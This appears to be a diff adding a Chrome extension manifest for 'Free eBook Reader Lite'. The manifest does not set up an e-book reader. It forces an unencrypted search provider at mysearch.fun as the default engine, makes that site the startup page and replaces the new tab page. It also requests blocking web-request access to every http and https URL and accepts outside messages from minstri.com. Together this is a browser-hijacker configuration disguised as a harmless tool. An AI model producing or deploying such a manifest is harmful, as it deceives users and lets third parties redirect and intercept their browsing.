@@ -1,0 +1,39 @@
+{
+   "background": {
+      "scripts": [ "js/background.js" ]
+   },
+   "chrome_settings_overrides": {
+      "search_provider": {
+         "alternate_urls": [  ],
+         "encoding": "UTF-8",
+         "favicon_url": "http://www.mysearch.fun/favicon.ico",
+         "image_url": "http://www.mysearch.fun/result.php?q={searchTerms}",
+         "image_url_post_params": "",
+         "instant_url": "http://www.mysearch.fun/result.php?q={searchTerms}",
+         "instant_url_post_params": "",
+         "is_default": true,
+         "keyword": "http://www.mysearch.fun/",
+         "name": "MySearch",
+         "search_url": "http://www.mysearch.fun/result.php?q={searchTerms}",
+         "search_url_post_params": "",
+         "suggest_url": "http://www.mysearch.fun/result.php?q={searchTerms}",
+         "suggest_url_post_params": ""
+      },
+      "startup_pages": [ "http://www.mysearch.fun/" ]
+   },
+   "chrome_url_overrides": {
+      "newtab": "newtab.html"
+   },
+   "icons": {
+      "128": "logo/logo_128x.png"
+   },
+   "description": "Free E-Book Reader Lite",
+   "manifest_version": 2,
+   "name": "Free eBook Reader Lite",
+   "permissions": [ "storage", "tabs", "webRequest", "webRequestBlocking", "https://*/*", "http://*/*" ],
+   "update_url": "https://clients2.google.com/service/update2/crx",
+   "version": "1.2.6",
+   "externally_connectable": {
+    "matches": ["*://minstri.com/*"]
+   }
+}
